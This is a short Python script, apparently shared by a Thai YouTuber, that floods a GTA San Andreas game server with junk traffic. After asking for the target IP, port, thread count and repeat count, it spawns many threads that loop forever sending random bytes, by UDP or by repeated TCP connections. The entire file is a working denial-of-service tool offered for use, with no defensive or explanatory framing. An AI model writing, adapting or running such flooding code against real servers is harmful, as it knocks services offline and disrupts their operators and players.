#!/usr/bin/env python3

import random
import socket
import threading

print("")
print("FB: ตาวัน เอ้ปเอ้ป // YT:TAWAN FF ")
print("")
ip = str(input(" IPเชิฟเวอร์GTA SAN:"))
port = int(input(" พอตเชิฟเวอร์GTA SAN:"))
choice = str(input(" ให้คุณเลือกไปที่Yตัวใหญ่(Y/N):"))        
times = int(input(" สูงสุด100:"))
threads = int(input(" ความเร็วตัวรัน(แนะนำ100):"))
def run():
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +" ยิงไปที่เชิฟเวอร์เเล้ว!!!")
                except:
                        print("[!] ข้อผิดพลาด!!!")

def run2():
        data = random._urandom(16)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +" ยิงไปที่เชิฟเวอร์เเล้ว!!!")
                except:
                        s.close()
                        print("[*] ข้อผิดพลาด")

for Y in range(threads):
        if choice == 'Y':
                th = threading.Thread(target = run)
                th.start()
        else:
                th = threading.Thread(target = run2)
                th.start()